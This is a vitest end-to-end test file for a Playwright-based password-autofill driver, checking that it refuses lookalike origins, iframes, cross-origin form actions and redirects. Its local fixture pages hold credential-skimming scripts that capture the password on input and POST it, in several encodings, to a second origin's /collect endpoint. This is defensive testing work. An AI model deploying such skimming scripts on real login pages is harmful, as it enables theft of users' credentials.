import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { randomUUID } from 'node:crypto';
import { PlaywrightFillDriver } from '../../src/browser/playwright-driver.js';
import { RemoteFillDriver } from '../../src/browser/remote-driver.js';
import { SecretMaterial, zeroize } from '../../src/secret-material.js';
import type { FillOutcome } from '../../src/types.js';
import { E2E_REASON, descendants, e2eEnabled, inspectBrowserProcesses, localServer, loginPage, pngPixel, until } from './fixtures.js';

describe.skipIf(!e2eEnabled)(`browser acceptance 2, 3, 4, 6, 7 (test-only single-process, no sandbox) — ${E2E_REASON}`, () => {
  let first: Awaited<ReturnType<typeof localServer>>;
  let second: Awaited<ReturnType<typeof localServer>>;
  let passwordEvents = 0;
  let collected = 0;
  let submitted = 0;
  let fontResponses: import('node:http').ServerResponse[] = [];
  const originalTmpdir = process.env.TMPDIR;

  beforeAll(async () => {
    process.env.TMPDIR = '/dev/shm';
    second = await localServer((request, response) => {
      if (request.url?.startsWith('/collect')) collected += 1;
      response.end('<!doctype html><body>Destination</body>');
    });
    first = await localServer((request, response) => {
      const path = new URL(request.url ?? '/', first.origin).pathname;
      response.setHeader('Content-Type', 'text/html');
      const signal = 'password.addEventListener("input",()=>{fetch("/filled")});';
      if (path === '/filled') { passwordEvents += 1; response.end('ok'); return; }
      if (path === '/font') { fontResponses.push(response); return; }
      if (path === '/redirect') { response.writeHead(302, { Location: `${second.origin}/back` }); response.end(); return; }
      if (path === '/redirect-hop') { response.writeHead(302, { Location: '/redirect' }); response.end(); return; }
      if (path === '/session') { submitted += 1; response.end('<body>Logged in</body>'); return; }
      if (path === '/session-redirect') { submitted += 1; response.writeHead(303, { Location: `${second.origin}/landing` }); response.end(); return; }
      if (path === '/forward-submit') { response.writeHead(307, { Location: '/forward-hop' }); response.end(); return; }
      if (path === '/forward-hop') { response.writeHead(307, { Location: `${second.origin}/collect` }); response.end(); return; }
      if (path === '/iframe') { response.end('<iframe src="/frame"></iframe>'); return; }
      if (path === '/frame') { response.end(loginPage()); return; }
      if (path === '/cross-action') { response.end(loginPage(`${second.origin}/collect`, '', signal)); return; }
      if (path === '/javascript-action') { response.end(loginPage('javascript:void(0)', '', signal)); return; }
      if (path === '/data-action') { response.end(loginPage('data:text/html,fixture', '', signal)); return; }
      if (path === '/mutate-action') { response.end(loginPage('/session', '', `${signal}username.addEventListener('input',()=>{document.querySelector('form').action=${JSON.stringify(`${second.origin}/collect`)}})`)); return; }
      if (path === '/navigate') { response.end(loginPage('/session', '', `password.addEventListener('input',()=>{location.href=${JSON.stringify(second.origin)}})`)); return; }
      if (path.startsWith('/exfil-')) {
        const mode = path.slice('/exfil-'.length);
        const transform = mode === 'base64' ? 'btoa(unescape(encodeURIComponent(value)))' : mode === 'url' ? 'encodeURIComponent(value)' : mode === 'json' ? 'JSON.stringify(value).slice(1,-1)' : 'value';
        response.end(loginPage('/session', '', `password.addEventListener('input',()=>{const value=password.value;fetch(${JSON.stringify(`${second.origin}/collect`)},{method:'POST',mode:'no-cors',body:${transform}}).catch(()=>{})})`)); return;
      }
      if (path === '/submit-redirect') { response.end(loginPage('/session-redirect')); return; }
      if (path === '/forward') { response.end(loginPage('/forward-submit')); return; }
      if (path === '/slow') {
        response.end(loginPage('/session', '<style>@font-face{font-family:hold;src:url(/font)}body{font-family:hold}</style><p>Font hold</p>', signal)); return;
      }
      if (path === '/fallback') {
        response.end(loginPage('/session', '', signal).replace('autocomplete="username"', 'type="email"')); return;
      }
      response.end(loginPage('/session', '<textarea>private</textarea><select><option>private</option></select><div contenteditable>private</div>', signal));
    });
  });

  afterAll(async () => {
    for (const response of fontResponses) response.end(); fontResponses = [];
    await first?.close(); await second?.close();
    if (originalTmpdir === undefined) delete process.env.TMPDIR; else process.env.TMPDIR = originalTmpdir;
  });

  function driver() { return new PlaywrightFillDriver({ timeoutMs: 10_000, testOnlyDisableSandbox: true }); }
  async function fill(path: string, submit = false, startOrigin = first.origin): Promise<FillOutcome> {
    const browser = driver();
    const password = SecretMaterial.fromUtf8(['canary', randomUUID(), '%"\\雪'].join('-'));
    try {
      const result = await browser.fill({ intent: { operationId: randomUUID(), itemId: 'fixture-login', origin: first.origin,
        startUrl: `${startOrigin}${path}`, submit, devMode: true }, material: { username: ['fixture-user', 'example.invalid'].join('@'), password, totp: null } });
      expect(password.disposed).toBe(false);
      return result;
    } finally { password.dispose(); await browser.close(); }
  }

  function expectRefusal(result: FillOutcome, code: string) {
    try { expect(result.ok).toBe(false); if (!result.ok) expect(result.code).toBe(code); }
    finally { zeroize(result.screenshot?.data); }
  }

  it('2: exact-origin fill succeeds with opaque black masks covering both fields', async () => {
    const result = await fill('/');
    try {
      expect(result.ok).toBe(true);
      expect(result.screenshot !== null).toBe(true);
      expect(result.screenshot!.maskedRegions).toBeGreaterThanOrEqual(5);
      expect(pngPixel(result.screenshot!.data, 25, 25)).toEqual([0, 0, 0]);
      expect(pngPixel(result.screenshot!.data, 25, 65)).toEqual([0, 0, 0]);
      if (result.ok) expect(result.finalOrigin).toBe(first.origin);
    } finally { zeroize(result.screenshot?.data); }
  });

  it('2: username fallback and form submission use the checked form', async () => {
    const before = submitted;
    const result = await fill('/fallback', true);
    try { expect(result.ok).toBe(true); expect(submitted - before).toBe(1); if (result.ok) expect(result.submitted).toBe(true); }
    finally { zeroize(result.screenshot?.data); }
  });

  it('3: subdomain is refused before filling', async () => {
    const before = passwordEvents;
    expectRefusal(await fill('/', false, `http://login.localhost:${first.port}`), 'origin_mismatch');
    expect(passwordEvents).toBe(before);
  });
  it('4: lookalike is refused before filling', async () => {
    const before = passwordEvents;
    expectRefusal(await fill('/', false, `http://loca1host:${first.port}`), 'origin_mismatch');
    expect(passwordEvents).toBe(before);
  });
  it('refuses an iframe-only password', async () => { expectRefusal(await fill('/iframe'), 'not_top_frame'); });
  it.each(['/cross-action', '/javascript-action', '/data-action'])('6: refuses %s before password input', async (path) => {
    const before = passwordEvents;
    expectRefusal(await fill(path), 'cross_origin_form_action');
    expect(passwordEvents).toBe(before);
  });
  it.each(['/redirect', '/redirect-hop'])('6: refuses each off-origin redirect hop %s', async (path) => {
    const before = passwordEvents;
    expectRefusal(await fill(path), 'cross_origin_redirect');
    expect(passwordEvents).toBe(before);
  });
  it('rechecks the form action after the username input event', async () => {
    const before = passwordEvents;
    expectRefusal(await fill('/mutate-action'), 'cross_origin_form_action');
    expect(passwordEvents).toBe(before);
  });
  it('blocks off-origin main-frame navigation during fill', async () => { expectRefusal(await fill('/navigate'), 'cross_origin_redirect'); });
  it.each(['raw', 'url', 'base64', 'json'])('blocks %s password exfiltration without returning it', async (encoding) => {
    const before = collected;
    expectRefusal(await fill(`/exfil-${encoding}`), 'cross_origin_form_action');
    expect(collected).toBe(before);
  });
  it('reports an allowed off-origin GET redirect after the checked submit', async () => {
    const result = await fill('/submit-redirect', true);
    try { expect(result.ok).toBe(true); if (result.ok) expect(result.finalOrigin).toBe(second.origin); }
    finally { zeroize(result.screenshot?.data); }
  });
  it('does not forward the credential body through a 307 redirect chain', async () => {
    const before = collected;
    expectRefusal(await fill('/forward', true), 'cross_origin_form_action');
    expect(collected).toBe(before);
  });
  it('7: browser process tree has no TCP listener or debug port; extensions and API access are blocked', async () => {
    const browser = driver();
    const password = SecretMaterial.fromUtf8(['canary', randomUUID()].join('-'));
    const before = passwordEvents;
    const pending = browser.fill({ intent: { operationId: randomUUID(), itemId: 'fixture-login', origin: first.origin,
      startUrl: `${first.origin}/slow`, submit: false, devMode: true }, material: { username: 'fixture-user', password, totp: null } });
    try {
      await until(() => passwordEvents > before);
      const inspection = await inspectBrowserProcesses(await descendants(process.pid));
      expect(inspection.commandLines.length > 0).toBe(true);
      expect(inspection.listeningOwned).toEqual([]);
      expect(inspection.commandLines.every((parts) => parts.every((part) => !part.startsWith('--remote-debugging-port')))).toBe(true);
      expect(inspection.commandLines.some((parts) => parts.includes('--disable-extensions'))).toBe(true);
      expect(Object.getOwnPropertyNames(PlaywrightFillDriver.prototype).sort()).toEqual(['close', 'constructor', 'fill']);
      expect(Object.getOwnPropertyNames(RemoteFillDriver.prototype).sort()).toEqual(['close', 'constructor', 'fill']);
    } finally {
      for (const response of fontResponses) response.end(); fontResponses = [];
      const outcome = await pending; zeroize(outcome.screenshot?.data);
      password.dispose(); await browser.close();
    }
  });
});
